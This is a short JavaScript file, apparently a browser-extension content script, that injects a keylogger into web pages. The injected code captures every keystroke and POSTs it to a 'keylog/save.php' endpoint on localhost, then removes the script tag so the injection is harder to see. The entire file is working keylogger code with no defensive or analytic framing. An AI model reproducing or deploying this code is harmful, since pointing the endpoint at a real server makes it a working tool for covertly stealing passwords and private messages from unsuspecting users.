var actualCode = `

document.addEventListener("keydown", keyDownTextField, false);

function keyDownTextField(e) {
  var letter = String.fromCharCode(e.keyCode);

  send(letter);
}

function send(letter){
  var request = new XMLHttpRequest();
  request.open('POST', 'http://localhost/keylog/save.php', true);
  request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
  request.send("data=" + letter);
}

`;

var script = document.createElement('script');
script.textContent = actualCode;
(document.head||document.documentElement).appendChild(script);
script.remove();
